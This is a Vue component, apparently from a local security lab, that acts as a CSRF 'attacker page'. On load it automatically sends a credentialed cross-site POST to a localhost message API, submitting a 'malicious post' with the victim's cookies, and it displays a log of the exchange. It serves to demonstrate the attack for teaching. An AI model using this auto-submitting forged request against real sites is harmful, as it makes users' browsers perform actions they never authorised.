<template>
  <div class="p-6 font-sans">
    <h1 class="text-2xl mb-4">CSRF 攻撃者ページ</h1>

    <div class="mb-4 p-4 border rounded bg-white">
      <h2 class="font-semibold mb-2">送信ログ</h2>
      <pre class="bg-gray-50 p-2 rounded text-sm">{{ log.join("\n\n") }}</pre>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref } from "vue";

const log = ref<string[]>([]);

onMounted(async () => doFetchPost());

async function doFetchPost() {
  // ログ用に表示
  log.value.push(
    `[Fetch POST] ${new Date().toLocaleTimeString()} -> sending...`
  );

  try {
    const url = "http://localhost:3001/api/messages";
    const option = {
      method: "POST",
      credentials: "include", // ここが重要：被害者サイトの Cookie を自動送信させる（CSRF を実演）
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ content: "悪意のある投稿です" }),
    }
    log.value.push("[Fetch POST] request: \n" + JSON.stringify({
      url,
      ...option
    }))
    const resp = await fetch(url, option as RequestInit);
    log.value.push(
      `[Fetch POST] ${new Date().toLocaleTimeString()} Status: ${resp.status} ${resp.statusText
      }`
    );
    // try to read body as text (may be blocked by CORS)
    try {
      const txt = await resp.text();
      log.value.push(`[Fetch POST] response body:\n${txt.replaceAll("\n", "")}`);
    } catch (e) {
      log.value.push(
        `[Fetch POST] response body: (could not read - CORS / opaque response)`
      );
    }
  } catch (err: any) {
    log.value.push(`[Fetch POST] Error: ${String(err)}`);
  }
}
</script>

<style scoped>
/* 簡易スタイル（必要ならお好みで） */
body {
  font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto,
    "Helvetica Neue", Arial;
}
</style>
